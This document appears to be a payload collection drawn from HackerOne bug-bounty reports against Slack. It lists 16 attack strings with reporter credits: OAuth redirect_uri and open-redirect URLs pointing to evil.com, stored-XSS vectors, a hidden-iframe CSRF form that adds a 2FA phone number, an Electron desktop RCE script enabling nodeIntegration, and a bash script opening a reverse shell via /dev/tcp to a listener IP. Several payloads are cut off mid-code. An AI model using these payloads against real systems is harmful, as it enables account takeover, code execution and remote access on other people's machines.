# Slack

16 payloads.

### `bf33d3d3`

```
https://target.com/oauth/authorize?client_id=...&scope=read,post&redirect_uri=https://evil.com/../../redirect_url=https://evil2.com/a.php%2Fcomplete
```

**Parameter:** `redirect_uri`
— [Broken Authentication (including Slack OAuth bugs)](https://hackerone.com/reports/2559) · Slack · [anandpingsafe](https://hackerone.com/anandpingsafe)

### `87bf6d6b`

```
https://target.com/oauth/authorize?client_id=...&scope=read,post&redirect_uri=https://evil.com/../../redirect_url=https://evil2.com/a.php%2Fcomplete
```

**Parameter:** `redirect_uri`
— [Broken Authentication (including Slack OAuth bugs)](https://hackerone.com/reports/2559) · Slack · [anandpingsafe](https://hackerone.com/anandpingsafe)

### `e2865b7b`

```
http://target.com/link?url=http%3A%2F%2Fevil.com
```

**Parameter:** `url`
— [Open Redirect in Slack](https://hackerone.com/reports/4549) · Slack · [prakharprasad](https://hackerone.com/prakharprasad)

### `b7e400d3`

```
<javascript:alert(document.cookie);>
```

— [Stored XSS in Slackbot Direct Messages](https://hackerone.com/reports/4561) · Slack · [prakharprasad](https://hackerone.com/prakharprasad)

### `b52bc00f`

```
https://target.com/dialog/oauth?client_id=569627156411038&redirect_uri=https%3A%2F%2Fevil2.com%2Ffiles-pri%2FT025M9QPZ-F0283NJ20%2Fhash.swf&response_type=token&scope=user_photos&sdk=joey
```

**Parameter:** `redirect_uri`
— [Facebook Takeover using Slack using 302 from target.com with access_token](https://hackerone.com/reports/6017) · Slack · [fransrosen](https://hackerone.com/fransrosen)

### `3a037786`

```
https://target.com/link?url=http://evil.com
```

**Parameter:** `url`
— [open redirect in https://target.com](https://hackerone.com/reports/6035) · Slack · [ipk1](https://hackerone.com/ipk1)

### `171f7bb7`

```
https://target.com/?redir=llink?url=https://evil.com/
```

**Parameter:** `redir`
— [Open Redirect login account](https://hackerone.com/reports/16718) · Slack · [jaysonzabate](https://hackerone.com/jaysonzabate) · $100.0

### `525ef230`

```
www.[TEAM].evil.com/?redir=llink?url=https://target.com/
```

**Parameter:** `redir`
— [Open Redirect login account](https://hackerone.com/reports/16718) · Slack · [jaysonzabate](https://hackerone.com/jaysonzabate) · $100.0

### `1e61fe60`

```
<svg width="100%" height="100%" viewBox="0 0 100 100" xmlns="http://target.com/2000/svg" onload="alert('script')">
  <script type="text/javascript"><![CDATA[
  // some exploit code here
  ]]></script>

  <circle cx="50" cy="50" r="50" fill="green" />
</svg>
```

— [Executing scripts on target.com using SVG](https://hackerone.com/reports/100565) · Slack · [kamil_hism](https://hackerone.com/kamil_hism)

### `d9ffa45e`

```
alert('script')
```

— [Executing scripts on target.com using SVG](https://hackerone.com/reports/100565) · Slack · [kamil_hism](https://hackerone.com/kamil_hism)

### `9acf956a`

```
{"type":"rocket","event":"rocket","payload":{"mm":[["fi",[],3,{"type":"unfurl","originalFragment":{"_bindings":{"attach":[[]],"mutation:post":[[]],"attached":[[]],"detach":[[]],"detached":[[]]},"_bindingLock":0,"_customData":[],"_data":{"type":"p","text":"javascript:alert(document.domain%29","tabbing":0,"links":{"javascript:alert(\"XSS\"%29":[0,22]},"formats":[]},"_dom":null,"_mutable":{"_lock":0},"_mutableGuard":{"_lock":0},"_parent":null,"_text":"javascript:alert(\"XSS\"%29","_tabbing":0,"_lin
```

— [Stored XSS on target.com using new Markdown editor of posts inside the Editing mode and using javascript-URIs](https://hackerone.com/reports/132104) · Slack · [fransrosen](https://hackerone.com/fransrosen)

### `3cd4d99f`

```
POST /api/files.uploadAsync HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Length: 886
Content-Type: multipart/form-data; boundary=---------------------------89481407720596
Origin: https://<subdomain>.evil.com
Connection: keep-alive

-----------------------------89481407720596
Content-Disposition: 
```

**Parameter:** `file`
— [Open Redirect on target.com](https://hackerone.com/reports/140447) · Slack · [sudotop](https://hackerone.com/sudotop) · $500.0

### `31a54cf7`

```
<html>
<body>
<IFRAME style="display:none" name="hidden-form"></iframe>
    <form action="https://target.com/account/settings/2fa_sms" method="POST" target="hidden-form" name="pocframe">
      <input type="hidden" name="verify&#95;two&#95;factor" value="1" />
      <input type="hidden" name="backup" value="" />
      <input type="hidden" name="app" value="" />
      <input type="hidden" name="country&#95;code" value="AU" />
      <input type="hidden" name="phone&#95;number" value="█████████
```

— [CSRF - Add optional two factor mobile number](https://hackerone.com/reports/155774) · Slack · [nhavis](https://hackerone.com/nhavis) · $500.0

### `b338cc38`

```
10.0.0.0/8
```

— [TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services](https://hackerone.com/reports/333419) · Slack · [sandrogauci](https://hackerone.com/sandrogauci) · $3,500.0

### `99c307c4`

```
<html>
<body>
<script>
  // overwrite functions to get a BrowserWindow object:
  window.desktop.delegate = {}
  window.desktop.delegate.canOpenURLInWindow = () => true
  window.desktop.window = {}
  window.desktop.window.open = () => 1
  bw = window.open('about:blank') // leak BrowserWindow class
  nbw = new bw.constructor({show: false, webPreferences: {nodeIntegration: true}}) // let's make our own with nodeIntegration
  nbw.loadURL('about:blank') // need to load some URL for interaction
  nbw.
```

— [Remote Code Execution in Slack desktop apps + bonus](https://hackerone.com/reports/783877) · Slack · [oskarsv](https://hackerone.com/oskarsv)

### `d2baf1d9`

```
#!/bin/bash
bash -i >& /dev/tcp/LISTENER_IP_ADDRESS/443 0>&1 &
DEVICE=$1
CIDER=$2
IP=$3
/sbin/ifconfig $1 $2 $3

4. Make the script executable by running `chmod +x /tmp/ifconfig`

5. Run the Nebula client with the command `sudo ./nebula -config config.yml`. When the ifconfig command is called, it will execute the reverse shell command in the script and then continue connecting.

6. On the host in step 1, a reverse Bash shell connects. Run the command "whoami" (or id) and "hostname" and verify th
```

— [Relative Path Vulnerability Results in Arbitrary Command Execution/Privilege Escalation](https://hackerone.com/reports/784714) · Slack · [jhancock](https://hackerone.com/jhancock) · $750.0
